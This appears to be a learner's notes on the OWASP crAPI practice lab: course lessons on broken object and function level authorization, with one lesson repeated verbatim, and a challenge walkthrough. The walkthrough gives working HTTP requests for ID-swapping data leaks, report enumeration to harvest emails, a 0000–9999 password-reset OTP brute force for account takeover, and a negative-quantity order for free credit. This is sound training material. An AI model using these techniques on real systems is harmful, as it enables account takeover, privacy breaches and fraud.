# [The completely ridiculous API](https://github.com/OWASP/crAPI)

<br>

## [Examples, lessons, and more on Exploiting APIs](https://university.apisec.ai/products/apisec-certified-expert/categories/2150251350)

<br>

## The API 
## http://crapi.apisec.ai/login

<br>

## The Email Client
## http://crapi.apisec.ai:8025/

<br>

<br>

## Broken Function Level Authorization  

Where BOLA is all about accessing resources that do not belong to you, BFLA is all about performing unauthorized actions. BFLA vulnerabilities are common for requests that perform actions of other users. These requests could be lateral actions or escalated actions. Lateral actions are requests that perform actions of users that are the same role or privilege level. Escalated actions are requests that perform actions that are of an escalated role like an administrator. The main difference between hunting for BFLA is that you are looking for functional requests. This means that you will be testing for various HTTP methods, seeking out actions of other users that you should not be able to perform.

If you think of this in terms of a social media platform, an API consumer should be able to delete their own profile picture, but they should not be able to delete other users' profile pictures. The average user should be able to create or delete their own account, but they likely shouldn't be able to perform administrative actions for other user accounts. For BFLA we will be hunting for very similar requests to BOLA.

1.  Resource ID: a resource identifier will be the value used to specify a unique resource. 
2.  Requests that perform authorized actions. In order to test if you can access another update, delete, or otherwise alter other the resources of other users.
3.  Missing or flawed access controls. In order to exploit this weakness, the API provider must not have access controls in place. 

Notice that the hunt for BFLA looks familiar, the main difference is that we will be seeking out functional requests. When we are thinking of CRUD (create, read, update, and delete), BFLA will mainly concern requests that are used to update, delete, and create resources that we should not be authorized to. For APIs that means that we should scrutinize requests that utilize POST, PUT, DELETE, and potentially GET with parameters.  We will need to search through the API documentation and/or collection for requests that involve altering the resources of other users. So, if we can find requests that create, update, and delete resources specified by a resource ID then we will be on the right track. If the API you are attacking includes administrative requests or even separate admin documentation, then those will be key to see if you are able to successfully request those admin actions as a non-admin user.  

Let's return to our crAPI collection to see which requests are worth testing for BFLA. The first two requests I found in our collection were these:

-   **POST /workshop/api/shop/orders/return_order?order_id=5893280.0688146055**
-   **POST /community/api/v2/community/posts/w4ErxCddX4TcKXbJoBbRMf/comment** 
-   **PUT /identity/api/v2/user/videos/:id**

When attacking sometimes you will need to put on your black hat thinking cap and determine what can be accomplished by successful exploitation. In the POST request to return an order, a successful exploit of this would result in having the ability to return anyone's orders. This could wreak havoc on a business that depends on sales with a low return rate. An attacker could cause a fairly severe disruption to the business. In the PUT request, there could be the potential to create, update, delete any user's videos. This would be disruptive to user accounts and cause a loss of trust in the security of the organization. Not to mention the potential social engineering implications, imagine an attacker being able to upload videos as any other user on whichever social media platform.

The purpose of the **_POST /community/api/v2/community/posts/w4ErxCddX4TcKXbJoBbRMf/comment_** request is to add a comment to an existing post. This will not alter the content of anyone else's post. So, while at first glance this appeared to be a potential target, this request fulfills a business purpose and does not expose the target organization to any significant risk. So, we will not dedicate any more time to testing this request. 

With BFLA we will perform a very similar test to BOLA. However, we will go one step further from A-B testing. For BFLA we will perform A-B-A testing. The reason is with BFLA there is a potential to alter another user's resources. So when performing testing there is a chance that we receive a successful response indicating that we have altered another user's resources, but to have a stronger PoC we will want to verify with the victim's account. So, we make valid requests as UserA, switch out to our UserB token, attempt to make requests altering UserA's resources, and return to UserA's account to see if we were successful.

**Please take note: When successful, BFLA attacks can alter the data of other users. This means that accounts and documents that are important to the organization you are testing could be on the line. DO NOT brute force BFLA attacks, instead, use your secondary account to safely attack your own resources. Deleting other users' resources in a production environment will likely be a violation of most rules of engagement for bug bounty programs and penetration tests.**

The two requests that look interesting for a BFLA attack include the return order request and the PUT request to update the video names. Both of these requests should require authorization to access resources that belong to the given user. Let's focus on the request to update video names. 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/fxM3prtBSzKWiBfCH36I_Authz9.PNG)

In the captured request we can see that UserA's video is specified by the resource ID "757". 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/grUU8iWLTnG6dNaMKMPp_Authz10.PNG)

Now if we change the request so that we are using UserB's token and attempt to update the video name, we should be able to see if this request is vulnerable to a BFLA attack. 

  ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/tBYOcg0KRhi3DQENvK15_Authz11.PNG)

As we can see in the attack, the API provider response is strange. Although we requested to update UserA's video, the server issued a successful response. However, the successful response indicated that UserB updated the name to the video identified as 758, UserB's video. So, this request does not seem to be vulnerable even though the response behavior was strange. Strange behavior from an app response is always worth further investigation. We should investigate other request methods that can be used for this request. 

![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/TAMib5qQmaVM8omLOEjk_Authz12.PNG)

Replacing PUT with DELETE illicit's a very interesting response, "This is an admin function. Try to access the admin API". In all of our testing, up to this point, we have not come across an admin API, so this is really intriguing. If we analyze the current request **DELETE /identity/api/v2/user/videos/758** there does seem like one obvious part of the path that we could alter. What if we try updating the request to DELETE /identity/api/v2/**admin**/videos/758, so that we replace "user" with "admin"?

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/0QWlHfabSD2AxT7QJQYz_Authz13.PNG)

 Success! We have now discovered an admin path and we have exploited a BFLA weakness by deleting another user's video.

Congratulations on performing successful authorization testing and exploitation. This attack is so great because the impact is often severe, while the technique is pretty straightforward. Authorization vulnerabilities continue to be the most common API vulnerabilities, so be vigilant in testing for these.   

 



# Broken Function Level Authorization

##### [Exploiting API Authorization](https://university.apisec.ai/products/apisec-certified-expert/categories/2150251350)

## Broken Function Level Authorization  

Where BOLA is all about accessing resources that do not belong to you, BFLA is all about performing unauthorized actions. BFLA vulnerabilities are common for requests that perform actions of other users. These requests could be lateral actions or escalated actions. Lateral actions are requests that perform actions of users that are the same role or privilege level. Escalated actions are requests that perform actions that are of an escalated role like an administrator. The main difference between hunting for BFLA is that you are looking for functional requests. This means that you will be testing for various HTTP methods, seeking out actions of other users that you should not be able to perform.

If you think of this in terms of a social media platform, an API consumer should be able to delete their own profile picture, but they should not be able to delete other users' profile pictures. The average user should be able to create or delete their own account, but they likely shouldn't be able to perform administrative actions for other user accounts. For BFLA we will be hunting for very similar requests to BOLA.

1.  Resource ID: a resource identifier will be the value used to specify a unique resource. 
2.  Requests that perform authorized actions. In order to test if you can access another update, delete, or otherwise alter other the resources of other users.
3.  Missing or flawed access controls. In order to exploit this weakness, the API provider must not have access controls in place. 

Notice that the hunt for BFLA looks familiar, the main difference is that we will be seeking out functional requests. When we are thinking of CRUD (create, read, update, and delete), BFLA will mainly concern requests that are used to update, delete, and create resources that we should not be authorized to. For APIs that means that we should scrutinize requests that utilize POST, PUT, DELETE, and potentially GET with parameters.  We will need to search through the API documentation and/or collection for requests that involve altering the resources of other users. So, if we can find requests that create, update, and delete resources specified by a resource ID then we will be on the right track. If the API you are attacking includes administrative requests or even separate admin documentation, then those will be key to see if you are able to successfully request those admin actions as a non-admin user.  

Let's return to our crAPI collection to see which requests are worth testing for BFLA. The first two requests I found in our collection were these:

-   **POST /workshop/api/shop/orders/return_order?order_id=5893280.0688146055**
-   **POST /community/api/v2/community/posts/w4ErxCddX4TcKXbJoBbRMf/comment** 
-   **PUT /identity/api/v2/user/videos/:id**

When attacking sometimes you will need to put on your black hat thinking cap and determine what can be accomplished by successful exploitation. In the POST request to return an order, a successful exploit of this would result in having the ability to return anyone's orders. This could wreak havoc on a business that depends on sales with a low return rate. An attacker could cause a fairly severe disruption to the business. In the PUT request, there could be the potential to create, update, delete any user's videos. This would be disruptive to user accounts and cause a loss of trust in the security of the organization. Not to mention the potential social engineering implications, imagine an attacker being able to upload videos as any other user on whichever social media platform.

The purpose of the **_POST /community/api/v2/community/posts/w4ErxCddX4TcKXbJoBbRMf/comment_** request is to add a comment to an existing post. This will not alter the content of anyone else's post. So, while at first glance this appeared to be a potential target, this request fulfills a business purpose and does not expose the target organization to any significant risk. So, we will not dedicate any more time to testing this request. 

With BFLA we will perform a very similar test to BOLA. However, we will go one step further from A-B testing. For BFLA we will perform A-B-A testing. The reason is with BFLA there is a potential to alter another user's resources. So when performing testing there is a chance that we receive a successful response indicating that we have altered another user's resources, but to have a stronger PoC we will want to verify with the victim's account. So, we make valid requests as UserA, switch out to our UserB token, attempt to make requests altering UserA's resources, and return to UserA's account to see if we were successful.

**Please take note: When successful, BFLA attacks can alter the data of other users. This means that accounts and documents that are important to the organization you are testing could be on the line. DO NOT brute force BFLA attacks, instead, use your secondary account to safely attack your own resources. Deleting other users' resources in a production environment will likely be a violation of most rules of engagement for bug bounty programs and penetration tests.**

The two requests that look interesting for a BFLA attack include the return order request and the PUT request to update the video names. Both of these requests should require authorization to access resources that belong to the given user. Let's focus on the request to update video names. 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/fxM3prtBSzKWiBfCH36I_Authz9.PNG)

In the captured request we can see that UserA's video is specified by the resource ID "757". 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/grUU8iWLTnG6dNaMKMPp_Authz10.PNG)

Now if we change the request so that we are using UserB's token and attempt to update the video name, we should be able to see if this request is vulnerable to a BFLA attack. 

  ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/tBYOcg0KRhi3DQENvK15_Authz11.PNG)

As we can see in the attack, the API provider response is strange. Although we requested to update UserA's video, the server issued a successful response. However, the successful response indicated that UserB updated the name to the video identified as 758, UserB's video. So, this request does not seem to be vulnerable even though the response behavior was strange. Strange behavior from an app response is always worth further investigation. We should investigate other request methods that can be used for this request. 

![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/TAMib5qQmaVM8omLOEjk_Authz12.PNG)

Replacing PUT with DELETE illicit's a very interesting response, "This is an admin function. Try to access the admin API". In all of our testing, up to this point, we have not come across an admin API, so this is really intriguing. If we analyze the current request **DELETE /identity/api/v2/user/videos/758** there does seem like one obvious part of the path that we could alter. What if we try updating the request to DELETE /identity/api/v2/**admin**/videos/758, so that we replace "user" with "admin"?

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/0QWlHfabSD2AxT7QJQYz_Authz13.PNG)

 Success! We have now discovered an admin path and we have exploited a BFLA weakness by deleting another user's video.

Congratulations on performing successful authorization testing and exploitation. This attack is so great because the impact is often severe, while the technique is pretty straightforward. Authorization vulnerabilities continue to be the most common API vulnerabilities, so be vigilant in testing for these.   

 


# Broken Object Level Authorization

##### [Exploiting API Authorization](https://university.apisec.ai/products/apisec-certified-expert/categories/2150251350)

##  Broken Object Level Authorization (BOLA)

When authorization controls are lacking or missing, UserA will be able to request UserB’s (along with many other) resources. APIs use values, such as names or numbers, to identify various objects. When we discover these object IDs, we should test to see if we can interact with the resources of other users when unauthenticated or authenticated as a different user. The first step toward exploiting BOLA is to seek out the requests that are the most likely candidates for authorization weaknesses. 

 When hunting for BOLA there are three ingredients needed for successful exploitation.

1.  Resource ID: a resource identifier will be the value used to specify a unique resource. This could be as simple as a number, but will often be more complicated.
2.  Requests that access resources. In order to test if you can access another user's resource, you will need to know the requests that are necessary to obtain resources that your account should not be authorized to access.
3.  Missing or flawed access controls. In order to exploit this weakness, the API provider must not have access controls in place. This may seem obvious, but just because resource IDs are predictable, does not mean there is an authorization vulnerability present.

The third item on the list is something that must be tested, while the first two are things that we can seek out in API documentation and within a collection of requests. Once you have the combination of these three ingredients then you should be able to exploit BOLA and gain unauthorized access to resources. 

 

## Finding Resource IDs and Request

You can test for authorization weaknesses by understanding how an API’s resources are structured and then attempting to access resources you shouldn’t be able to access. By detecting patterns within API paths and parameters, you might be able to predict other potential resources. The bold resource IDs in the following API requests should catch your attention:

```
-   GET /api/resource/1
-   GET /user/account/find?user_id=15
-   POST /company/account/Apple/balance
-   POST /admin/pwreset/account/90
```


In these instances, you can probably guess other potential resources, like the following, by altering the bold values:

```
-   GET /api/resource/**3**
-   GET /user/account/find?user_id=**23**
-   POST /company/account/**Google**/balance
-   POST /admin/pwreset/account/**111**
```

In these simple examples, you’ve performed an attack by merely replacing the bold items with other numbers or words. If you can successfully access the information you shouldn’t be authorized to access, you have discovered an authorization vulnerability.

 

Here are a few ideas for 

 

requests that could be good targets for an authorization test. 

 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/expdzRMeT7oYzCVtiZAC_Authz3.PNG)

Let’s check out crAPI and see what sorts of IDs are used to identify resources. We can do this by checking out the documentation and by making requests to the API.

## Searching for BOLA


**First, think about the purpose of the target app and review the documentation**
Thinking through the purpose of the app will give you a conceptual overview and help aim your sights. Ask questions like: 
What can you do with this app? 
Do you get your own profile? Can you upload files? 
Do you have an account balance? 
Is there any part of the app that has data specific to your account? 
Questions like these will help you search through the available requests and find a starting point for discovering requests that access resources. If we ask these questions about crAPI then you should come up with the following:

-   crAPI is an application designed for new vehicle purchases. The app also allows a user to purchase items through a storefront, message other users in a public forum, and update their own user profile.
-   Yes, crAPI lets users have their own profile. A user's profile contains a picture, basic user information (name, email, phone number), and a personal video.
-   crAPI users have the ability to upload a profile picture and a personal video.
-   Parts of the app that are specific to a user's account include
    -   The user dashboard with the user's vehicle added
    -   The user's profile
    -   The user's past orders in the shop
    -   The user's posts in the community forum

Now that we have a better idea of the purpose of the app, we should seek out requests that can provide us with relevant resources. If you remember back to the module covering Excessive Data Exposure, then there should be one request that stands out.

-   **GET /identity/api/v2/videos/:id?video_id=589320.0688146055**
-   **GET /community/api/v2/community/posts/w4ErxCddX4TcKXbJoBbRMf**
-   **GET /identity/api/v2/vehicle/{resourceID}/location  
    ** 

Note that the second request here is for public information. This request retrieves a specific request on the public crAPI forum. As far as BOLA goes, this request has the first two ingredients, but this request functions as designed by sharing public information with a group. So, no authorization is necessary for crAPI users to access this data.

##  Authorization Testing Strategy

When searching for authorization vulnerabilities the most effective way to find authorization weaknesses is to create two accounts and perform A-B testing. The A-B testing process consists of:

1.  Create a UserA account.
2.  Use the API and discover requests that involve resource IDs as UserA.
3.  Document requests that include resource IDs and should require authorization.
4.  Create a UserB account.
5.  Obtaining a valid UserB token and attempt to access UserA's resources.

You could also do this by using UserB's resources with a UserA token. In the case of the previously mentioned requests, we should make successful requests as UserA then create a UserB account, update to the UserB token, and attempt to make the requests using UserA's resource IDs. We've already been through the account creation process several times, so I will skip ahead to a request that looks interesting.

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/Cw2hcLuT4a9xb7aSzjXw_Authz5.PNG)

This request looks interesting from a BOLA perspective because it is a request for a location that is based on the complex-looking vehicle ID. As UserB, I've gone through the crAPI interface and registered a vehicle. I then used the "Refresh Location" button on the web app to trigger the above request.

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/J1eeUJyqS3mi2l0G1IXU_Authz6.PNG)

To make things easier for this attack capture the UserB request with Burp Suite. 

 ![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/OSrAuKbdTm68zifCUqvn_Authz7.PNG)

 

 Next, perform the BOLA attack by replacing UserB's token with UserA's token and see if you can make a successful request. 

 

![](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/w4M6Wsu0Rm9XXNjTFHMr_Authz8.PNG)

Success! UserA's token is able to make a successful request and capture the GPS location of UserB's car along with their vehicleLocation ID and fullName.

In the GET request to the /community/api/v2/community/posts/recent, we discovered that the forum has excessive data exposure. One sensitive piece of data that was exposed was the vehicleID. At first glance, a developer could think that an ID of this complexity (a 32 alphanumeric token) does not require authorization security controls, something along the lines of security through obscurity. However, the complexity of this token would only help prevent or delay a brute-force attack. Leveraging the earlier discovered excessive data exposure vulnerability and combining it with this BOLA vulnerability is a real pro move. It provides a strong PoC and drives home the point of how severe these vulnerabilities really are.

 

# Intro

This is the crAPI challenge page.

crAPI (Completely Ridiculous Application Programmer Interface) defines an API which is intentionally vulnerable to the OWASP API Top 10 vulnerabilities. crAPI is meant to illustrate and educate by presenting these issues for you to discover and exploit.

The crAPI challenge is for you to find and exploit as many of these vulnerabilities as you can.

There are two approaches to hack crAPI - the first is to look at it as a complete black box test, where you get no directions, but just try to understand the app from scratch and hack it.

The second approach is using this page, which will give you an idea about which vulnerabilities exist in crAPI and will direct you on how to exploit them. 

<br>

# Challenges

## BOLA Vulnerabilities

### [  ] Challenge 1 - Access details of another user’s vehicle

**To solve the challenge, you need to leak sensitive information of another user’s vehicle.**

* Since vehicle IDs are not sequential numbers, but GUIDs, you need to find a way to expose the vehicle ID of another user.

* Find an API endpoint that receives a vehicle ID and returns information about it.

```http
GET /identity/api/v2/vehicle/79511fa6-aa61-4985-b659-044446de8cd6/location HTTP/1.1
Host: crapi.apisec.ai
```

```json
{"carId":"79511fa6-aa61-4985-b659-044446de8cd6","vehicleLocation":{"id":6,"latitude":"31.9726318","longitude":"34.7958503"},"fullName":"hadil"}

```


replace your carId number in the URL,  with that of another user, and now you have another user's location & vehicle info

### [ ] Challenge 2 - Access mechanic reports of other users

crAPI allows vehicle owners to contact their mechanics by submitting a "contact mechanic" form. This challenge is about accessing mechanic reports that were submitted by other users.

* Analyze the report submission process

* Find an hidden API endpoint that exposes details of a mechanic report

* Change the report ID to access other reports

<br>

**The report submission**
```http
 POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: crapi.apisec.ai

{
  "mechanic_code": "TRAC_JME",
  "problem_details": "Also, when I bought this car, it smelled like a dirty sock. Pls fix",
  "vin": "6CZTY05UVQT584223",
  "mechanic_api": "http://crapi.apisec.ai/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}

```
<br>

Resp
```json
{"response_from_mechanic_api":{"id":75,"sent":true,"report_link":"http://crapi.apisec.ai/workshop/api/mechanic/mechanic_report?report_id=75"},"status":200}
```
<br>

The hidden endpoint you need to access is displayed in the response, you will need to create a custom request. and access a `report_id` other than your own.

```http
GET /workshop/api/mechanic/mechanic_report?report_id=5 HTTP/1.1
Host: crapi.apisec.

```
<br>

Resp
```json
{
  "id": 5,
  "mechanic": {
    "id": 2,
    "mechanic_code": "TRAC_JME",
    "user": {
      "email": "james@example.com",
      "number": ""
    }
  },
  "vehicle": {
    "id": 45,
    "vin": "4FTVZ46ZYHU404703",
    "owner": {
      "email": "adam007@example.com",
      "number": "9876895423"
    }
  },
  "problem_details": "My car Lamborghini - Aventador is having issues.\nCan you give me a call on my mobile 9876895423,\nOr send me an email at adam007@example.com \nThanks,\nAdam.\n",
  "status": "Pending",
  "created_on": "11 February, 2025, 14:05:42"
}
```
<br>

### You can then send one of these requests to Intruder and get all users email addys to use to crack passwords/break authentication
```http
GET /workshop/api/mechanic/mechanic_report?report_id=5 HTTP/1.1
Host: crapi.apisec.ai
```
<br>

You can manually guess report Ids, or send to intruderset position for the value of `report_id` 
```http
GET /workshop/api/mechanic/mechanic_report?report_id=§ § HTTP/1.1
Host: crapi.apisec.ai
```


Set the payloads

##  Broken User Authentication

### [  ] Challenge 3 - Reset the password of a different user

* Find an email address of another user on crAPI

* Experiment with password reset

* Discover that the pw reset times is limmited on the v3 api, but not v2
  ```http
  POST /identity/api/auth/v3/check-otp
  Host: crapi.apisec.ai
  ```
<br>
  
So do a pw reset OTP brute force to take over someone elses acct.
Send the req to Intruder, payload positions
```http
POST /identity/api/auth/v2/check-otp HTTP/1.1
Host: crapi.apisec.ai
...
{"email":"victimsemail@test.com","otp":"§0000§","password":"Passw0rd!"}

```

Then set the position as sniper, and the Payload sets as:
- Number
- From: 0000
- to: 9999
- step: 1

  Number format: decimal
  min integer: 4
  max int:     4

Then attack

<br>


## Excessive Data Exposure

### [  ] Challenge 4 - Find an API endpoint that leaks sensitive information of other users

That's the mechanic report endpoit from previous challenge
```http
GET /workshop/api/mechanic/mechanic_report?report_id=31 HTTP/1.1
Host: crapi.apisec.ai
```



### Challenge 5 - Find an API endpoint that leaks an internal property of a video &
<br>

### Challenge 10 - Update internal video properties

After solving the "Find an API endpoint that leaks an internal property of videos" challenge, try to find an endpoint that would allow you to change the internal property of the video. Changing the value can help you to exploit another vulnerability.


In this challenge, you need to find an internal property of the video resource that shouldn’t be exposed to the user. This property name and value can help you to exploit other vulnerabilities.

### Video Upload
```http
POST /identity/api/v2/user/videos  HTTP/1.1
Host: crapi.apisec.ai

------WebKitFormBoundaryrgciUwNo75PemQeL
Content-Disposition: form-data; name="file"; filename="Carl_YourePissingMeOff.mp4"
Content-Type: video/mp4
```

response
```json
{"id":244,"video_name":"Carl_YourePissingMeOff.mp4","conversion_params":"-v codec h264","profileVideo":"data:image/jpeg;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAABdrbW9vdgAAAGxtdmhkAAA
}
```


Go to your `/my-profile` endpoint, and change video name, send this to the repeater

![[Screenshot_20240618_193757.png]]

That's where the PUT request and video ID endpoint come from
![[Screenshot_20240618_194347.png]]
 Send the video name change request to repeater,
 Then logged out as Frylock, logged in as Shake, and replaced the tokens
with Shake's new ones, sent the request, and boom.. there's a BFLA

I was able to change the video name of another user



## Rate Limiting

### Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature
	(Maybe later)


## BFLA 

(Return to this one later)

### Challenge 7 - Delete a video of another user

* Leverage the predictable nature of REST APIs to find an admin endpoint to delete videos
* Delete a video of someone else

<br>



## Mass Assignment

### Challenge 8 - Get an item for free

crAPI allows users to return items they have ordered. You simply click the "return order" button, receive a QR code and show it in a USPS store.
To solve this challenge, you need to find a way to get refunded for an item that you haven’t actually returned.

* Leverage the predictable nature of REST APIs to find a shadow API endpoint that allows you to edit properties of a specific order.


<br>

### Challenge 9 - Increase your balance by $1,000 or more

After solving the "Get an item for free" challenge, be creative and find a way to get refunded for an item you never returned, but this time try to get a bigger refund.

```http
POST /workshop/api/shop/orders HTTP/1.1
Host: crapi.apisec.ai

{"product_id":2,"quantity":-100}
```

Response
```json
{"id":118,"message":"Order sent successfully.","credit":1110.0}
```
<br>

## Challenge 10 - Update internal video properties

After solving the "Find an API endpoint that leaks an internal property of videos" challenge, try to find an endpoint that would allow you to change the internal property of the video. Changing the value can help you to exploit another vulnerability.


## SSRF

### Challenge 11 - Make crAPI send an HTTP call to "[www.google.com](www.google.com)" and return the HTTP response. 

## NoSQL Injection

### Challenge 12 - Find a way to get free coupons without knowing the coupon code.

## SQL Injection

### Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database

## Unauthenticated Access

### Challenge 14 - Find an endpoint that does not perform authentication checks for a user.

## JWT Vulnerabilities

### Challenge 15 - Find a way to forge valid JWT Tokens

JWT Authentication in crAPI is vulnerable to various attacks. Find any one way to forge a valid JWT token and get full access to the platform.

## << 2 secret challenges >>

There are two more secret challenges in crAPI, that are pretty complex, and for now we don’t share details about them, except the fact they are really cool. 
